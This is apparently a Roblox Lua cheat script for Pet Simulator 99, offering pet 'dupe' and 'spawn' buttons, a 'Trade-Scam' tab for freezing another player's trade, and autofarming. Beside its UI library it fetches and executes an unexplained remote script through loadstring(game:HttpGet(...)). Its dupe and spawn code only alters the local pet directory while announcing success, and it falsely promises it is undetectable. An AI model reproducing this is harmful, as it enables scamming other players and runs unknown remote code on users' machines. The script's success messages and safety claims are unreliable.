local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({Name = "HiddenScriptsHub🎩-Pet Simulator 99 -[SpongeBob Update 🧽]", HidePremium = false, IntroText = "HiddenScriptsHub", IntroIcon = "rbxassetid://18170549235", Icon = "rbxassetid://18170549235", SaveConfig = true, ConfigFolder = "OrionTest"})
loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptingHubs/HiddenScripts/main/petsimulator99x"))()
local Tab = Window:MakeTab({
	Name = "Pet-Dupe",
	Icon = "rbxassetid://17591461401",
	PremiumOnly = false
})
--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]
local Section = Tab:AddSection({
	Name = "Duping-Petsimulator99"
})

--[[
Name = <string> - The name of the section.
]]
Tab:AddTextbox({
	Name = "Dupe-Quantity🏷️",
	Default = "Number",
	TextDisappear = true,
	Callback = function(Value)
		print(Value)
	end	  
})

--[[
Name = <string> - The name of the textbox.
Default = <string> - The default value of the textbox.
TextDisappear = <bool> - Makes the text disappear in the textbox after losing focus.
Callback = <function> - The function of the textbox.
]]
Tab:AddButton({
	Name = "Click-to-Dupe 🎯",
	Callback = function()
	OrionLib:MakeNotification({
	Name = "Successfully Duped",
	Content = "30 Pets Has Been Successfully Duped",
	Image = "rbxassetid://4483345998",
	Time = 10
})
local lib = require(game.ReplicatedStorage.Library)

local fromPet = "Holographic Axolotl"
local toPet = "Huge Happy Rock"

for i,v in pairs(lib.Directory.Pets[fromPet]) do
  lib.Directory.Pets[fromPet][i] = nil
end
for i,v in pairs(lib.Directory.Pets[toPet]) do
  lib.Directory.Pets[fromPet][i] = v
end
   		print("Successfully Duped!")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]
Tab:AddToggle({
	Name = "Safe-Dupe🦺",
	Default = true,
	Callback = function(Value)
		print(Value)
	end    
})
Tab:AddParagraph("NOTE❗","Equip Pets That u want to be Duped")
local Tab = Window:MakeTab({
	Name = "Pet-Spawner",
	Icon = "rbxassetid://17591790578",
	PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]
local Section = Tab:AddSection({
	Name = "Spawner-Petsimulator99"
})

--[[
Name = <string> - The name of the section.
]]
Tab:AddTextbox({
	Name = "Number-of-pets-to-Spawn 📌",
	Default = "",
	TextDisappear = false,
	Callback = function(Value)
		print(Value)
	end	  
})

--[[
Name = <string> - The name of the textbox.
Default = <string> - The default value of the textbox.
TextDisappear = <bool> - Makes the text disappear in the textbox after losing focus.
Callback = <function> - The function of the textbox.
]]
Tab:AddButton({
	Name = "Click-to-Spawn 🎯",
	Callback = function()
	OrionLib:MakeNotification({
	Name = "Successfully Spawned",
	Content = "Pets Has Been Successfully Spawned",
	Image = "rbxassetid://4483345998",
	Time = 10
})
	local lib = require(game.ReplicatedStorage.Library)

local fromPet = "Bloo Cat"
local toPet = "Titanic SpongeBob SquarePants"

for i,v in pairs(lib.Directory.Pets[fromPet]) do
  lib.Directory.Pets[fromPet][i] = nil
end
for i,v in pairs(lib.Directory.Pets[toPet]) do
  lib.Directory.Pets[fromPet][i] = v
end
	
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]
Tab:AddTextbox({
	Name = "Name-of-the-pet 🏷️",
	Default = "",
	TextDisappear = false,
	Callback = function(Value)
		print(Value)
	end	  
})
local Tab = Window:MakeTab({
	Name = "Trade-Scam",
	Icon = "rbxassetid://17592110789",
	PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]
local Section = Tab:AddSection({
	Name = "Tradescam-Petsimulator99"
})

--[[
Name = <string> - The name of the section.
]]
Tab:AddTextbox({
	Name = "Player-Name",
	Default = "Name",
	TextDisappear = true,
	Callback = function(Value)
		print(Value)
	end	  
})

--[[
Name = <string> - The name of the textbox.
Default = <string> - The default value of the textbox.
TextDisappear = <bool> - Makes the text disappear in the textbox after losing focus.
Callback = <function> - The function of the textbox.
]]
Tab:AddButton({
	Name = "Click-to-Freeze-Trade",
	Callback = function()
      		print("button pressed")
  	end    
})
local Tab = Window:MakeTab({
	Name = "Autofarm",
	Icon = "rbxassetid://17877506043",
	PremiumOnly = false
})
local Section = Tab:AddSection({
	Name = "Autofarm"
})

--[[
Name = <string> - The name of the section.
]]
Tab:AddToggle({
	Name = "Toggle Autofarm✅",
	Default = false,
	Callback = function(Value)
		print(Value)
	end    
})
Tab:AddParagraph("Autofarm","Automatically Autofarm's the user's Last Area")
local Tab = Window:MakeTab({
	Name = "Script-Info🗞️",
	Icon = "rbxassetid://17877536381",
	PremiumOnly = false
})
local Section = Tab:AddSection({
	Name = "Information"
})
Tab:AddParagraph("(🗣️)-Discord Server","Join my discord server report bugs👆")
Tab:AddButton({
	Name = "Copy Link To Discord Server 🎯",
	Callback = function()
	setclipboard("https://discord.com/invite/ZQbaTKNsRy")
      		print("button pressed")
  	end    
})
Tab:AddParagraph("Credits","All Coded And Developed By HiddenScriptsHubYT")
Tab:AddParagraph("Note❗","Script is Undetectable u will not get banned by using this")
--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]
--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]
--[[
Name = <string> - The name of the textbox.
Default = <string> - The default value of the textbox.
TextDisappear = <bool> - Makes the text disappear in the textbox after losing focus.
Callback = <function> - The function of the textbox.
]]

--[[
Name = <string> - The name of the toggle.
Default = <bool> - The default value of the toggle.
Callback = <function> - The function of the toggle.
]]

--[[
Name = <string> - The name of the textbox.
Default = <string> - The default value of the textbox.
TextDisappear = <bool> - Makes the text disappear in the textbox after losing focus.
Callback = <function> - The function of the textbox.
]]

--[[
Name = <string> - The name of the toggle.
Default = <bool> - The default value of the toggle.
Callback = <function> - The function of the toggle.
]]
CoolToggle:Set(true)



--[[
Name = <string> - The name of the section.
]]
--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]
--[[
Name = <string> - The name of the toggle.
Default = <bool> - The default value of the toggle.
Callback = <function> - The function of the toggle.
]]
--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]
--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]

--[[
Name = <string> - The name of the dropdown.
Default = <string> - The default value of the dropdown.
Options = <table> - The options in the dropdown.
Callback = <function> - The function of the dropdown.
]]
OrionLib:Init()
